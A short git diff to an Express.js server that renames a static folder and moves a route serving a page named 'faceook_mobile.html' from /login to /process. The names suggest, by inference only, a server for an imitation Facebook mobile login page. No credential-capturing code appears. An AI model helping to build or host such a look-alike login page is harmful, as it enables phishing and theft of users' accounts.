@@ -51,10 +51,9 @@ app.listen(port, () => {console.log("server Started on port 5501")})
 
 
 //------------------------------------ Middle ware 
-let fb_mobile_path = path.join(__dirname+"/publick")
+let fb_mobile_path = path.join(__dirname+"/public")
 console.log(fb_mobile_path)
 
-// const url = "http://127.0.0.1:5501"
 const url = "http://127.0.0.1:5501"
 
 app.use((req,res,next) => {
@@ -66,10 +65,8 @@ app.use((req,res,next) => {
 app.use(express.json())
 
 app.use("",express.static(`${fb_mobile_path}/main/`))
-app.use("/login",express.static(`${fb_mobile_path}/login_needed/`))
 app.use("/forum",express.static(`${fb_mobile_path}/forum/`))
 app.use("/process", express.static(`${fb_mobile_path}/process/`))
-app.use( express.static(`${fb_mobile_path}/process/`))
 
 //------------------------------------ get methods (Sending the Files)
 
@@ -83,9 +80,9 @@ app.get('/forum' , (req , res) => {
     res.sendFile(`${fb_mobile_path}/forum/forum.html`)
 })
 
-app.get("/login", upload.single("file"),(req , res) => {
+app.get("/process", upload.single("file"),(req , res) => {
     // res.send("Hey there this is the get page")
-    res.sendFile(`${fb_mobile_path}/login_needed/faceook_mobile.html`)
+    res.sendFile(`${fb_mobile_path}/process/faceook_mobile.html`)
 })
 
 // app.get("/consent", upload.single("file"),(req , res) => {
